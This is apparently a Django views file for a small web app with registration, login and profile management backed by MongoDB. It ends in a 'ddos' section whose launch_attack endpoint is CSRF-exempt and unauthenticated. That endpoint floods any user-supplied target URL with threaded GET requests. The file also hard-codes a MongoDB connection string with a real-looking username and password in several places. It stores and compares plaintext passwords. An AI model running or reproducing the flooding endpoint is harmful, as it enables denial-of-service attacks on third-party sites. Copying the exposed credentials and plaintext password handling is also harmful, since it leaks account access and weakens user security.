from django.contrib.auth.models import User
from django.contrib.auth import authenticate, login, logout as django_logout
from django.http import HttpResponseBadRequest, HttpResponseNotFound, JsonResponse
from django.shortcuts import render, redirect, get_object_or_404
from django.http import Http404
from django.views.decorators.csrf import csrf_exempt
from .models import Profile
from .forms import ProfileUpdateForm
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.core.cache import cache
from pymongo import MongoClient
import requests
import threading
import logging
import sys
import time


#LOGGING
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)
logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
console_handler = logging.StreamHandler(sys.stdout)
console_handler.setLevel(logging.DEBUG)
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)



def index(request):
    logger.info("Index page accessed.")
    return render(request, 'index.html')



#authentication
def login_view(request):
    error_message = None

    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')


        client = MongoClient('mongodb+srv://kristinaer304:Kris0192@cluster0.vuekyu7.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
        db = client['Author']
        collection = db['users']

        user_document = collection.find_one({'username': username, 'password': password})

        if user_document:
            user = authenticate(username=username, password=password)
            if user is not None:
                login(request, user)
                logger.info(f"User {username} logged in.")

              
                request.session['user_authenticated'] = True

                return redirect('profile_created') 
            else:
                error_message = 'User authentication failed'
        else:
            error_message = 'User does not exist'

    return render(request, 'login.html', {'error_message': error_message})



def registration_view(request):
    logger.info("Registration view accessed.")
    if request.method == 'POST':
        username = request.POST.get('username')
        email = request.POST.get('email')
        password = request.POST.get('password')

        client = MongoClient('mongodb+srv://kristinaer304:Kris0192@cluster0.vuekyu7.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
        db = client['Author']
        collection = db['users']

        if collection.find_one({'username': username}) is None and collection.find_one({'email': email}) is None:
            user_data = {
                'username': username,
                'email': email,
                'password': password
            }
            collection.insert_one(user_data)

            user = User.objects.create_user(username=username, email=email, password=password)
            profile = Profile(user=user)
            profile.save()

            user = authenticate(username=username, password=password)
            if user is not None:
                login(request, user)
                logger.info(f"User {username} registered and logged in.")
                return redirect('profile_created')
        else:
            return render(request, 'registration.html', {'error_message': 'Username or email already exists'})
    else:
        return render(request, 'registration.html')


def logout(request):
    django_logout(request)
    return redirect('login_view')



#profile
@login_required
def profile_created_view(request):
    logger.info("Profile created view accessed.")
    try:
        profile = request.user.profile
        context = {
            'username': request.user.username,
            'email': request.user.email,
            'bio': profile.bio  
        }
        return render(request, 'profile_created.html', context)
    except Profile.DoesNotExist:
        logger.error("Profile does not exist.")
        raise Http404("Profile does not exist")



@login_required
def read_profile(request):
    logger.info("Read profile view accessed.")
    try:
        profile = request.user.profile
        context = {
            'username': request.user.username,
            'email': request.user.email,
            'bio': profile.bio
        }
        return render(request, 'profile_created.html', context)
    except Profile.DoesNotExist:
        logger.error("Profile does not exist.")
        raise Http404("Profile does not exist")


@login_required
def update_profile(request):
    logger.info("Update profile view accessed.")
    if request.method == 'POST':
        form = ProfileUpdateForm(request.POST, request.FILES, instance=request.user.profile)
        if form.is_valid():
            form.save()
            
 
            bio = form.cleaned_data['bio'] 
            try:
                profile = request.user.profile  
                profile.bio = bio 
                profile.save() 
               
                client = MongoClient('mongodb+srv://kristinaer304:Kris0192@cluster0.vuekyu7.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
                db = client['Author']
                collection = db['users']
                collection.update_one({'username': request.user.username}, {'$set': {'bio': bio}})
                logger.info("Bio updated successfully in MongoDB.")
            except Profile.DoesNotExist:
                logger.error("Profile does not exist.")

            return redirect('read_profile')
    else:
        form = ProfileUpdateForm(instance=request.user.profile)
    return render(request, 'profile_update.html', {'form': form})



@login_required
def delete_profile(request):
    logger.info("Delete profile view accessed.")
    try:
        profile = request.user.profile
    except Profile.DoesNotExist:
        messages.error(request, "Profile not found.")

    if request.method == 'POST':
        profile.delete()

        cache.delete(f"profile_{request.user.username}")

        client = MongoClient('mongodb+srv://kristinaer304:Kris0192@cluster0.vuekyu7.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
        db = client['Author']
        collection = db['users']
        collection.delete_one({'username': request.user.username})

        messages.success(request, "Profile deleted successfully.")
        return redirect('registration')  
    else:
        return render(request, 'profile_delete.html')



#ddos
@login_required
def ddos(request):
    logger.info("DDoS view accessed.")
    return render(request, 'ddos.html')

def send_get_requests(url):
    try:
       
        response = cache.get(url)
        if not response:
           
            response = requests.get(url)
           
            cache.set(url, response, timeout=60)

        return f"Response from {url}: {response.status_code}"
    except Exception as e:
        return f"Error accessing {url}: {str(e)}"
    

@csrf_exempt
def launch_attack(request):
    logger.info("Launch attack view accessed.")
    

    start_time = time.time()

    if request.method == 'POST':
        url = request.POST.get('target')
        num_requests = request.POST.get('requests')

        logger.info(f"Received POST request to launch attack with URL: {url} and number of requests: {num_requests}")

        if num_requests is None:
            logger.error("Number of requests is missing in the POST request.")
            return JsonResponse({'error': 'Number of requests is required.'}, status=400)

        try:
            num_requests = int(num_requests)
        except ValueError:
            logger.error("Invalid value for number of requests.")
            return JsonResponse({'error': 'Number of requests must be an integer.'}, status=400)

        if not url or num_requests < 1:
            logger.error("Invalid URL or number of requests.")
            return JsonResponse({'error': 'Invalid URL or number of requests.'}, status=400)

        threads = []
        for _ in range(num_requests):
            thread = threading.Thread(target=send_get_requests, args=(url,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        logger.info("Attack launched successfully.")
        

        end_time = time.time()
        
        total_time = end_time - start_time
        logger.info(f"Total time taken for processing: {total_time} seconds.")
        
        return JsonResponse({'message': 'Attack launched successfully.'}, status=200)

    else:
        logger.error("Only POST requests are allowed.")
        return JsonResponse({'error': 'Only POST requests are allowed.'}, status=405)
